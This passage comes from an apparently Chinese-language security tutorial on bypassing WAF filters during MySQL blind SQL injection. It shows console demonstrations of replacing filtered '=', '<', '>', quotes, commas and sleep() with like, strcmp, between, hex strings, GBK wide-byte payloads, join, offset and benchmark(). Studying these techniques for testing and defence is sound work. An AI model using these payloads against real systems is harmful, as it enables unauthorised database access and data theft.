<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来<br>用来取代<code>=</code>时，<code>rlike</code>的用法和上面的<code>like</code>一样，没有通配符效果和<code>=</code>一样</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">rlike</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">regexp</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>使用大小于号来绕过</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">and</span> id <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> user2    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>&lt;&gt; 等价于 !&#x3D;<br>所以在前面再加一个<code>!</code>结果就是等号了</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> <span class="token operator">!</span><span class="token punctuation">(</span>id <span class="token operator">&lt;></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>等号绕过也可以使用strcmp(str1,str2)函数、between关键字等，具体可以参考后面的<code>过滤大小于号绕过</code></p><h3 id="过滤大小于号绕过"><a href="#过滤大小于号绕过" class="headerlink" title="过滤大小于号绕过"></a>过滤大小于号绕过</h3><p>在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，那就凉凉。怎么会呢，可以使用以下的关键字来绕过</p><ul><li>greatest(n1, n2, n3…):返回n中的最大值</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> greatest<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">116</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>least(n1,n2,n3…):返回n中的最小值</li><li>strcmp(str1,str2):若所有的字符串均相同，则返回 <strong>0</strong>，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token operator">!</span>strcmp<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token operator">!</span>strcmp<span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">117</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Empty <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>in关键字</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> substr<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'t'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.01</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> substr<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">in</span> <span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
Empty <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>between a and b:范围在a-b之间</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">between</span> <span class="token number">1</span> <span class="token operator">and</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> user2    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> substr<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token string">'a'</span> <span class="token operator">and</span> <span class="token string">'b'</span><span class="token punctuation">;</span>
Empty <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> substr<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token string">'a'</span> <span class="token operator">and</span> <span class="token string">'t'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用between a and b判等</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">where</span> id <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">and</span> substr<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">between</span> <span class="token string">'t'</span> <span class="token operator">and</span> <span class="token string">'t'</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h3><ul><li>使用十六进制</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> column_name  <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token number">0x7573657273</span><span class="token punctuation">;</span>
<span class="token number">1</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span></span></code></pre><ul><li>宽字节</li></ul><p>常用在web应用使用的字符集为<code>GBK</code>时，并且过滤了引号，就可以试试宽字节。</p><pre class="line-numbers language-none"><code class="language-none"># 过滤单引号时
%bf%27 %df%27 %aa%27
12
%df\’ &#x3D; %df%5c%27&#x3D;縗’
1<span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h3><p>如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用<code>from pos for len</code>，其中pos代表从pos个开始读取len长度的子串<br>例如在<code>substr()</code>等函数中，常规的写法是</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token string">"string"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------+</span>
<span class="token operator">|</span> substr<span class="token punctuation">(</span><span class="token string">"string"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------+</span>
<span class="token operator">|</span> str                  <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>如果过滤了逗号，可以这样使用<code>from pos for len</code>来取代</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> substr<span class="token punctuation">(</span><span class="token string">"string"</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------------------------------+</span>
<span class="token operator">|</span> substr<span class="token punctuation">(</span><span class="token string">"string"</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------------------+</span>
<span class="token operator">|</span> str                           <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在sql盲注中，如果过滤逗号，以下参考下面的写法绕过</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">120</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------------------------------+</span>
<span class="token operator">|</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">120</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------------------+</span>
<span class="token operator">|</span>                                            <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">110</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----------------------------------------------+</span>
<span class="token operator">|</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token number">1</span> <span class="token keyword">for</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">110</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------------------+</span>
<span class="token operator">|</span>                                            <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----------------------------------------------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>也可使用<code>join</code>关键字来绕过</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">join</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
<span class="token comment">#像(select 1)a是子查询，嵌套查询的时候子查询出来的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名。a是别名。</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> test1    <span class="token operator">|</span> pass     <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">2</span> <span class="token operator">|</span> user2    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> test3    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">|</span>  <span class="token number">1</span> <span class="token operator">|</span> <span class="token number">2</span>        <span class="token operator">|</span> <span class="token number">3</span>        <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中的</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">)</span>a <span class="token keyword">join</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">)</span>b <span class="token keyword">join</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">3</span><span class="token punctuation">)</span>c<span class="line-numbers-rows" aria-hidden="true"><span></span></span></code></pre><p>等价于</p><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="line-numbers-rows" aria-hidden="true"><span></span></span></code></pre><ul><li>使用<code>like</code>关键字<br>适用于<code>substr()</code>等提取子串的函数中的逗号</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">114</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">-------------------------------+</span>
<span class="token operator">|</span> ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">114</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------------------+</span>
<span class="token operator">|</span>                             <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">-------------------------------+</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">"r%"</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">------------------+</span>
<span class="token operator">|</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">"r%"</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">------------------+</span>
<span class="token operator">|</span>                <span class="token number">1</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">------------------+</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">"t%"</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">------------------+</span>
<span class="token operator">|</span> <span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">like</span> <span class="token string">"t%"</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">------------------+</span>
<span class="token operator">|</span>                <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">------------------+</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>使用offset关键字<br>适用于<code>limit</code>中的逗号被过滤的情况<br><code>limit 2,1</code>等价于<code>limit 1 offset 2</code></li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> test3    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>

mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> users <span class="token keyword">limit</span> <span class="token number">1</span> <span class="token keyword">offset</span> <span class="token number">2</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span> id <span class="token operator">|</span> username <span class="token operator">|</span> password <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token operator">|</span>  <span class="token number">3</span> <span class="token operator">|</span> test3    <span class="token operator">|</span> pass1    <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+----------+----------+</span>
<span class="token number">12345678910111213</span><span class="line-numbers-rows" aria-hidden="true"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h3><ul><li>sleep() –&gt;benchmark()</li></ul><pre class="language-sql line-numbers" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">12</span><span class="token punctuation">,</span><span class="token number">23</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">+</span><span class="token comment">----+-----------------+</span>
<span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span> <span class="token number">23</span> <span class="token operator">and</span> sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+-----------------+</span>
<span class="token operator">|</span> <span class="token number">12</span> <span class="token operator">|</span>               <span class="token number">0</span> <span class="token operator">|</span>
<span class="token operator">+</span><span class="token comment">----+-----------------+</span>
<span class="token number">1</span> <span class="token keyword">row</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">1.00</span> sec<span class="token punctuation">)</span>
<span class="token comment"># MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。 </span>
参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式
